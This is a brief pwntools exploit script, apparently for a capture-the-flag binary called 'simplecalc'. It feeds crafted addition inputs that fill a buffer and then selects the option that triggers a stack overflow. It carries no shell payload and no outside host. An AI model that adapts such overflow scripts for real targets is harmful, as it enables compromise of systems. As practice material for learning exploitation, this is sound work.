from pwn import *
import ctypes

p = process("simplecalc")

A_0 = 0x41414141/2
A_1 = 0x41414141/2 
A_1 += 1
#gdb.attach(p)
#p.interactive()

# number of calculations
p.sendline("20")

#6 calcs
for _ in xrange(0,6):
    p.sendline("1")
    p.sendline(str(A_0))
    p.sendline(str(A_1))

null_0 = 0xffffffff/2
null_1 = null_0 +2

for _ in xrange(6, 19):
    p.sendline("1")
    p.sendline(str(null_0))
    p.sendline(str(null_1))

# trigger overflow
p.sendline("5")
